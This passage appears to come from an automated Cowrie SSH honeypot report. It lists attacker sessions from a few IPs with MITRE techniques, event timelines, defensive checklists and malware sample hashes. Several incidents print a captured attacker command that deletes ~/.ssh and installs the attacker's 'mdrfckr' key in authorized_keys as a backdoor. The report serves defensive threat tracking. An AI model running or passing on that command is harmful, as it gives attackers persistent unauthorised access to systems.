| **First Seen** | 2026-04-25 13:55 |
| **Last Seen** | 2026-04-25 13:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:55:27` | `cowrie.session.connect` |
| `2026-04-25 13:55:27` | `cowrie.client.version` |
| `2026-04-25 13:55:28` | `cowrie.client.kex` |
| `2026-04-25 13:55:29` | `cowrie.login.success` |
| `2026-04-25 13:55:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.102.83[.]35` to AbuseIPDB if not already reported
- [ ] Block `177.102.83[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8617a0c066a5

| Field | Detail |
|---|---|
| **Source IP** | `177.102.83[.]35` |
| **First Seen** | 2026-04-25 13:56 |
| **Last Seen** | 2026-04-25 13:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:56:32` | `cowrie.session.connect` |
| `2026-04-25 13:56:32` | `cowrie.client.version` |
| `2026-04-25 13:56:32` | `cowrie.client.kex` |
| `2026-04-25 13:56:33` | `cowrie.login.success` |
| `2026-04-25 13:56:34` | `cowrie.session.params` |
| `2026-04-25 13:56:34` | `cowrie.command.input` |
| `2026-04-25 13:56:34` | `cowrie.command.failed` |
| `2026-04-25 13:56:34` | `cowrie.log.closed` |
| `2026-04-25 13:56:35` | `cowrie.session.params` |
| `2026-04-25 13:56:35` | `cowrie.command.input` |
| `2026-04-25 13:56:35` | `cowrie.session.file_download` |
| `2026-04-25 13:56:35` | `cowrie.log.closed` |
| `2026-04-25 13:56:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.102.83[.]35` to AbuseIPDB if not already reported
- [ ] Block `177.102.83[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-389c36acaf51

| Field | Detail |
|---|---|
| **Source IP** | `177.102.83[.]35` |
| **First Seen** | 2026-04-25 13:56 |
| **Last Seen** | 2026-04-25 13:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:56:39` | `cowrie.session.connect` |
| `2026-04-25 13:56:39` | `cowrie.client.version` |
| `2026-04-25 13:56:39` | `cowrie.client.kex` |
| `2026-04-25 13:56:41` | `cowrie.login.success` |
| `2026-04-25 13:56:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.102.83[.]35` to AbuseIPDB if not already reported
- [ ] Block `177.102.83[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0edfa479291

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-25 13:58 |
| **Last Seen** | 2026-04-25 13:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:58:51` | `cowrie.session.connect` |
| `2026-04-25 13:58:51` | `cowrie.client.version` |
| `2026-04-25 13:58:52` | `cowrie.client.kex` |
| `2026-04-25 13:58:53` | `cowrie.login.success` |
| `2026-04-25 13:58:53` | `cowrie.session.params` |
| `2026-04-25 13:58:53` | `cowrie.command.input` |
| `2026-04-25 13:58:53` | `cowrie.command.failed` |
| `2026-04-25 13:58:54` | `cowrie.log.closed` |
| `2026-04-25 13:58:54` | `cowrie.session.params` |
| `2026-04-25 13:58:54` | `cowrie.command.input` |
| `2026-04-25 13:58:55` | `cowrie.session.file_download` |
| `2026-04-25 13:58:55` | `cowrie.log.closed` |
| `2026-04-25 13:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7079fe15bfff

| Field | Detail |
|---|---|
| **Source IP** | `69.138.228[.]221` |
| **First Seen** | 2026-04-25 13:58 |
| **Last Seen** | 2026-04-25 13:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:58:58` | `cowrie.session.connect` |
| `2026-04-25 13:58:58` | `cowrie.client.version` |
| `2026-04-25 13:58:58` | `cowrie.client.kex` |
| `2026-04-25 13:58:59` | `cowrie.login.success` |
| `2026-04-25 13:59:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.138.228[.]221` to AbuseIPDB if not already reported
- [ ] Block `69.138.228[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd3e6ab0a15a

| Field | Detail |
|---|---|
| **Source IP** | `177.102.83[.]35` |
| **First Seen** | 2026-04-25 14:02 |
| **Last Seen** | 2026-04-25 14:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 14:02:43` | `cowrie.session.connect` |
| `2026-04-25 14:02:43` | `cowrie.client.version` |
| `2026-04-25 14:02:43` | `cowrie.client.kex` |
| `2026-04-25 14:02:44` | `cowrie.login.success` |
| `2026-04-25 14:02:45` | `cowrie.session.params` |
| `2026-04-25 14:02:45` | `cowrie.command.input` |
| `2026-04-25 14:02:45` | `cowrie.command.failed` |
| `2026-04-25 14:02:45` | `cowrie.log.closed` |
| `2026-04-25 14:02:46` | `cowrie.session.params` |
| `2026-04-25 14:02:46` | `cowrie.command.input` |
| `2026-04-25 14:02:47` | `cowrie.session.file_download` |
| `2026-04-25 14:02:47` | `cowrie.log.closed` |
| `2026-04-25 14:02:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.102.83[.]35` to AbuseIPDB if not already reported
- [ ] Block `177.102.83[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afa14beb0865

| Field | Detail |
|---|---|
| **Source IP** | `177.102.83[.]35` |
| **First Seen** | 2026-04-25 14:02 |
| **Last Seen** | 2026-04-25 14:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 14:02:50` | `cowrie.session.connect` |
| `2026-04-25 14:02:50` | `cowrie.client.version` |
| `2026-04-25 14:02:51` | `cowrie.client.kex` |
| `2026-04-25 14:02:52` | `cowrie.login.success` |
| `2026-04-25 14:02:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.102.83[.]35` to AbuseIPDB if not already reported
- [ ] Block `177.102.83[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6c48882808b

| Field | Detail |
|---|---|
| **Source IP** | `177.102.83[.]35` |
| **First Seen** | 2026-04-25 14:07 |
| **Last Seen** | 2026-04-25 14:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 14:07:13` | `cowrie.session.connect` |
| `2026-04-25 14:07:13` | `cowrie.client.version` |
| `2026-04-25 14:07:13` | `cowrie.client.kex` |
| `2026-04-25 14:07:15` | `cowrie.login.success` |
| `2026-04-25 14:07:15` | `cowrie.session.params` |
| `2026-04-25 14:07:15` | `cowrie.command.input` |
| `2026-04-25 14:07:15` | `cowrie.command.failed` |
| `2026-04-25 14:07:16` | `cowrie.log.closed` |
| `2026-04-25 14:07:16` | `cowrie.session.params` |
| `2026-04-25 14:07:16` | `cowrie.command.input` |
| `2026-04-25 14:07:17` | `cowrie.session.file_download` |
| `2026-04-25 14:07:17` | `cowrie.log.closed` |
| `2026-04-25 14:07:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.102.83[.]35` to AbuseIPDB if not already reported
- [ ] Block `177.102.83[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b81a32fdf077

| Field | Detail |
|---|---|
| **Source IP** | `177.102.83[.]35` |
| **First Seen** | 2026-04-25 14:07 |
| **Last Seen** | 2026-04-25 14:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 14:07:20` | `cowrie.session.connect` |
| `2026-04-25 14:07:20` | `cowrie.client.version` |
| `2026-04-25 14:07:21` | `cowrie.client.kex` |
| `2026-04-25 14:07:22` | `cowrie.login.success` |
| `2026-04-25 14:07:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.102.83[.]35` to AbuseIPDB if not already reported
- [ ] Block `177.102.83[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f84a264ae3e5

| Field | Detail |
|---|---|
| **Source IP** | `177.102.83[.]35` |
| **First Seen** | 2026-04-25 14:08 |
| **Last Seen** | 2026-04-25 14:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 14:08:26` | `cowrie.session.connect` |
| `2026-04-25 14:08:26` | `cowrie.client.version` |
| `2026-04-25 14:08:27` | `cowrie.client.kex` |
| `2026-04-25 14:08:28` | `cowrie.login.success` |
| `2026-04-25 14:08:29` | `cowrie.session.params` |
| `2026-04-25 14:08:29` | `cowrie.command.input` |
| `2026-04-25 14:08:29` | `cowrie.command.failed` |
| `2026-04-25 14:08:29` | `cowrie.log.closed` |
| `2026-04-25 14:08:30` | `cowrie.session.params` |
| `2026-04-25 14:08:30` | `cowrie.command.input` |
| `2026-04-25 14:08:30` | `cowrie.session.file_download` |
| `2026-04-25 14:08:30` | `cowrie.log.closed` |
| `2026-04-25 14:08:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.102.83[.]35` to AbuseIPDB if not already reported
- [ ] Block `177.102.83[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-395b2b42635c

| Field | Detail |
|---|---|
| **Source IP** | `177.102.83[.]35` |
| **First Seen** | 2026-04-25 14:08 |
| **Last Seen** | 2026-04-25 14:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 14:08:34` | `cowrie.session.connect` |
| `2026-04-25 14:08:34` | `cowrie.client.version` |
| `2026-04-25 14:08:34` | `cowrie.client.kex` |
| `2026-04-25 14:08:35` | `cowrie.login.success` |
| `2026-04-25 14:08:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.102.83[.]35` to AbuseIPDB if not already reported
- [ ] Block `177.102.83[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8a62c2a413a

| Field | Detail |
|---|---|
| **Source IP** | `177.102.83[.]35` |
| **First Seen** | 2026-04-25 14:09 |
| **Last Seen** | 2026-04-25 14:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 14:09:40` | `cowrie.session.connect` |
| `2026-04-25 14:09:40` | `cowrie.client.version` |
| `2026-04-25 14:09:41` | `cowrie.client.kex` |
| `2026-04-25 14:09:42` | `cowrie.login.success` |
| `2026-04-25 14:09:43` | `cowrie.session.params` |
| `2026-04-25 14:09:43` | `cowrie.command.input` |
| `2026-04-25 14:09:43` | `cowrie.command.failed` |
| `2026-04-25 14:09:43` | `cowrie.log.closed` |
| `2026-04-25 14:09:44` | `cowrie.session.params` |
| `2026-04-25 14:09:44` | `cowrie.command.input` |
| `2026-04-25 14:09:44` | `cowrie.session.file_download` |
| `2026-04-25 14:09:44` | `cowrie.log.closed` |
| `2026-04-25 14:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.102.83[.]35` to AbuseIPDB if not already reported
- [ ] Block `177.102.83[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0bf1e0bede1

| Field | Detail |
|---|---|
| **Source IP** | `177.102.83[.]35` |
| **First Seen** | 2026-04-25 14:09 |
| **Last Seen** | 2026-04-25 14:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 14:09:48` | `cowrie.session.connect` |
| `2026-04-25 14:09:48` | `cowrie.client.version` |
| `2026-04-25 14:09:48` | `cowrie.client.kex` |
| `2026-04-25 14:09:50` | `cowrie.login.success` |
| `2026-04-25 14:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.102.83[.]35` to AbuseIPDB if not already reported
- [ ] Block `177.102.83[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9718ab5058bc

| Field | Detail |
|---|---|
| **Source IP** | `177.102.83[.]35` |
| **First Seen** | 2026-04-25 14:14 |
| **Last Seen** | 2026-04-25 14:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 14:14:18` | `cowrie.session.connect` |
| `2026-04-25 14:14:18` | `cowrie.client.version` |
| `2026-04-25 14:14:19` | `cowrie.client.kex` |
| `2026-04-25 14:14:20` | `cowrie.login.success` |
| `2026-04-25 14:14:21` | `cowrie.session.params` |
| `2026-04-25 14:14:21` | `cowrie.command.input` |
| `2026-04-25 14:14:21` | `cowrie.command.failed` |
| `2026-04-25 14:14:21` | `cowrie.log.closed` |
| `2026-04-25 14:14:22` | `cowrie.session.params` |
| `2026-04-25 14:14:22` | `cowrie.command.input` |
| `2026-04-25 14:14:22` | `cowrie.session.file_download` |
| `2026-04-25 14:14:22` | `cowrie.log.closed` |
| `2026-04-25 14:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.102.83[.]35` to AbuseIPDB if not already reported
- [ ] Block `177.102.83[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e163528bde4e

| Field | Detail |
|---|---|
| **Source IP** | `177.102.83[.]35` |
| **First Seen** | 2026-04-25 14:14 |
| **Last Seen** | 2026-04-25 14:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 14:14:26` | `cowrie.session.connect` |
| `2026-04-25 14:14:26` | `cowrie.client.version` |
| `2026-04-25 14:14:26` | `cowrie.client.kex` |
| `2026-04-25 14:14:27` | `cowrie.login.success` |
| `2026-04-25 14:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.102.83[.]35` to AbuseIPDB if not already reported
- [ ] Block `177.102.83[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `69.138.228[.]221` | **26** | 2026-04-25 13:36 | 2026-04-25 13:58 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `177.102.83[.]35` | **18** | 2026-04-25 13:55 | 2026-04-25 14:15 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `91.196.152[.]206` | 1 | 2026-04-25 14:28 | 2026-04-25 14:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]244` | 1 | 2026-04-25 14:28 | 2026-04-25 14:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]245` | 1 | 2026-04-25 14:28 | 2026-04-25 14:28 | 10s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
